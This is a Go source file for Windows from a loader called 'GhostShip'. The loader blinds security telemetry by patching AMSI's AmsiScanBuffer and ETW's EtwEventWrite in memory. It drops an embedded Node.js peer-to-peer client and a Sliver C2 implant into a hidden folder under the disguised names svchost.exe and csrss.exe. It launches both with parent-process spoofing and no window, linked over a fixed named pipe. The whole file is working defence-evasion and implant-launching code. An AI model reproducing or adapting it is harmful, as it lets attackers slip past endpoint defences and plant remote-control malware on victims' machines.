//go:build windows

package core

import (
	"compress/gzip"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modkernel32 = windows.NewLazySystemDLL("kernel32.dll")
	modntdll    = windows.NewLazySystemDLL("ntdll.dll")
	modamsi     = windows.NewLazySystemDLL("amsi.dll")

	procInitializeProcThreadAttributeList = modkernel32.NewProc("InitializeProcThreadAttributeList")
	procUpdateProcThreadAttribute         = modkernel32.NewProc("UpdateProcThreadAttribute")
	procCreateProcess                     = modkernel32.NewProc("CreateProcessW")
)

const (
	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020002
	EXTENDED_STARTUPINFO_PRESENT         = 0x00080000
	CREATE_NO_WINDOW                     = 0x08000000
	CREATE_UNICODE_ENVIRONMENT           = 0x00000400
	PROCESS_ALL_ACCESS                   = 0x000F0000 | 0x00100000 | 0xFFFF
)

// Fixed named pipe name - Sliver implant must be generated with:
// generate --named-pipe \\.\pipe\gspipe --os windows --arch amd64
const PIPE_NAME = `\\.\pipe\gspipe`

type STARTUPINFOEX struct {
	windows.StartupInfo
	lpAttributeList uintptr
}

func Run(connString string) error {
	fmt.Println("[*] GhostShip Starting...")

	// 1. Telemetry Blinding (AMSI & ETW Patching)
	patchAmsiEtw()

	// 2. Create Hidden Runtime Directory
	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		localAppData = os.Getenv("TEMP")
	}

	workDir := filepath.Join(localAppData, fmt.Sprintf(".gs-%d", time.Now().UnixNano()))
	if err := os.MkdirAll(workDir, 0700); err != nil {
		return fmt.Errorf("failed to create work dir: %w", err)
	}
	defer os.RemoveAll(workDir)

	// Set directory as hidden
	pathPtr, _ := windows.UTF16PtrFromString(workDir)
	windows.SetFileAttributes(pathPtr, windows.FILE_ATTRIBUTE_HIDDEN)

	// 3. Extract Assets
	if err := extractAssets(workDir); err != nil {
		return fmt.Errorf("extract assets failed: %w", err)
	}

	// 4. Extract Binaries to hidden files
	nodePath := filepath.Join(workDir, "svchost.exe") // Disguised name
	if err := loadAssetToFile("node.gz", nodePath); err != nil {
		return fmt.Errorf("load node failed: %w", err)
	}

	payloadPath := filepath.Join(workDir, "csrss.exe") // Disguised name
	if err := loadAssetToFile("payload.gz", payloadPath); err != nil {
		return fmt.Errorf("load payload failed: %w", err)
	}

	// 5. Find Parent Process for PPID Spoofing
	ppid, _ := findProcessId("svchost.exe")
	if ppid == 0 {
		ppid, _ = findProcessId("explorer.exe")
	}

	fmt.Printf("[*] PPID Spoofing target: %d\n", ppid)

	// 6. Start Node.js P2P Client
	// Pass named pipe path and connection string
	nodeArgs := []string{
		nodePath,
		filepath.Join(workDir, "client.js"),
		connString,
	}
	nodeEnv := fmt.Sprintf("GS_NAMED_PIPE=%s", PIPE_NAME)

	nodeProc, err := startProcessSpoofed(nodePath, nodeArgs, workDir, ppid, nodeEnv)
	if err != nil {
		return fmt.Errorf("failed to start node: %w", err)
	}

	// Give Node.js time to create the named pipe server
	time.Sleep(3 * time.Second)

	// 7. Start Sliver Payload
	// Sliver was generated with --named-pipe \\.\pipe\gspipe
	// It will connect to that pipe automatically
	payloadArgs := []string{payloadPath}
	payloadEnv := "" // Sliver doesn't need env vars, pipe is hardcoded

	payloadProc, err := startProcessSpoofed(payloadPath, payloadArgs, workDir, ppid, payloadEnv)
	if err != nil {
		windows.TerminateProcess(nodeProc, 0)
		return fmt.Errorf("failed to start payload: %w", err)
	}

	fmt.Println("[+] All components started")

	// 8. Wait for either process to exit
	handles := []windows.Handle{nodeProc, payloadProc}
	event, _ := windows.WaitForMultipleObjects(handles, false, windows.INFINITE)

	// Cleanup: terminate both processes
	windows.TerminateProcess(nodeProc, 0)
	windows.TerminateProcess(payloadProc, 0)
	windows.CloseHandle(nodeProc)
	windows.CloseHandle(payloadProc)

	if event == windows.WAIT_OBJECT_0 {
		fmt.Println("[*] Node.js exited first")
	} else {
		fmt.Println("[*] Payload exited first")
	}

	return nil
}

func patchAmsiEtw() {
	// AMSI Patch (AmsiScanBuffer -> ret 18h)
	// Prevents PowerShell/script scanning
	amsiProc := modamsi.NewProc("AmsiScanBuffer")
	if amsiProc.Find() == nil {
		patchMemory(amsiProc.Addr(), []byte{0xC2, 0x18, 0x00})
		fmt.Println("[+] AMSI patched")
	}

	// ETW Patch (EtwEventWrite -> ret)
	// Prevents event logging
	etwProc := modntdll.NewProc("EtwEventWrite")
	if etwProc.Find() == nil {
		patchMemory(etwProc.Addr(), []byte{0xC3})
		fmt.Println("[+] ETW patched")
	}
}

func patchMemory(address uintptr, patch []byte) {
	var oldProtect uint32
	windows.VirtualProtect(address, uintptr(len(patch)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	for i, b := range patch {
		*(*byte)(unsafe.Pointer(address + uintptr(i))) = b
	}
	windows.VirtualProtect(address, uintptr(len(patch)), oldProtect, &oldProtect)
}

func findProcessId(name string) (uint32, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	err = windows.Process32First(snapshot, &entry)
	for err == nil {
		if strings.EqualFold(windows.UTF16ToString(entry.ExeFile[:]), name) {
			return entry.ProcessID, nil
		}
		err = windows.Process32Next(snapshot, &entry)
	}
	return 0, fmt.Errorf("process not found")
}

func startProcessSpoofed(path string, args []string, dir string, ppid uint32, env string) (windows.Handle, error) {
	var si STARTUPINFOEX
	si.StartupInfo.Cb = uint32(unsafe.Sizeof(si))

	// Setup PPID Spoofing if we have a valid parent
	if ppid > 0 {
		hParent, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, ppid)
		if err == nil {
			defer windows.CloseHandle(hParent)

			var size uintptr
			procInitializeProcThreadAttributeList.Call(0, 1, 0, uintptr(unsafe.Pointer(&size)))

			buffer := make([]byte, size)
			si.lpAttributeList = uintptr(unsafe.Pointer(&buffer[0]))

			procInitializeProcThreadAttributeList.Call(si.lpAttributeList, 1, 0, uintptr(unsafe.Pointer(&size)))
			procUpdateProcThreadAttribute.Call(
				si.lpAttributeList,
				0,
				uintptr(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
				uintptr(unsafe.Pointer(&hParent)),
				uintptr(unsafe.Sizeof(hParent)),
				0,
				0,
			)
		}
	}

	var pi windows.ProcessInformation
	cmdLine, _ := windows.UTF16PtrFromString(strings.Join(args, " "))
	dirPtr, _ := windows.UTF16PtrFromString(dir)

	// Build environment block
	envVars := os.Environ()
	if env != "" {
		envVars = append(envVars, env)
	}
	var envBlockStr string
	for _, v := range envVars {
		envBlockStr += v + "\x00"
	}
	envBlockStr += "\x00"
	envPtr, _ := windows.UTF16PtrFromString(envBlockStr)

	flags := uint32(CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT | CREATE_UNICODE_ENVIRONMENT)

	r1, _, err := procCreateProcess.Call(
		0,
		uintptr(unsafe.Pointer(cmdLine)),
		0,
		0,
		1, // bInheritHandles
		uintptr(flags),
		uintptr(unsafe.Pointer(envPtr)),
		uintptr(unsafe.Pointer(dirPtr)),
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)

	if r1 == 0 {
		return 0, err
	}

	windows.CloseHandle(pi.Thread)
	return pi.Process, nil
}

func loadAssetToFile(assetName, destPath string) error {
	f, err := Assets.Open("assets/" + assetName)
	if err != nil {
		return fmt.Errorf("open asset %s: %w", assetName, err)
	}
	defer f.Close()

	gz, err := gzip.NewReader(f)
	if err != nil {
		return fmt.Errorf("gzip reader %s: %w", assetName, err)
	}
	defer gz.Close()

	out, err := os.Create(destPath)
	if err != nil {
		return fmt.Errorf("create file %s: %w", destPath, err)
	}
	defer out.Close()

	// Set file as hidden
	pathPtr, _ := windows.UTF16PtrFromString(destPath)
	windows.SetFileAttributes(pathPtr, windows.FILE_ATTRIBUTE_HIDDEN)

	_, err = io.Copy(out, gz)
	return err
}
